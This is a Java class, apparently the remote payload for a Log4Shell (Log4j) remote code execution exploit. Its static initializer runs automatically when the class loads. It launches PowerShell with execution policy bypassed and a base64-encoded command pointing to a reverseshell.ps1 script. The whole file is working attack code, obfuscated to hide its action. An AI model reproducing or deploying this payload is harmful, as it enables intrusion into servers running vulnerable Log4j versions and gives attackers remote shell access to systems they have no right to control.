public class Log4JRCE {
    static{
        try{
            Runtime.getRuntime().exec("powershell.exe -exec bypass -enc " +
                    "QwA6AFwAVQBzAGUAcgBzAFwAVABpAG0AXABEAG8AYwB1AG0AZQBuAHQAcwBcAFIAZQBQAG8AcwBcAGwAbwBnADQAagBwAHcAbgBcAHIAZQB2AGUAcgBzAGUAcwBoAGUAbABsAC4AcABzADEA"
).waitFor();
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }

}
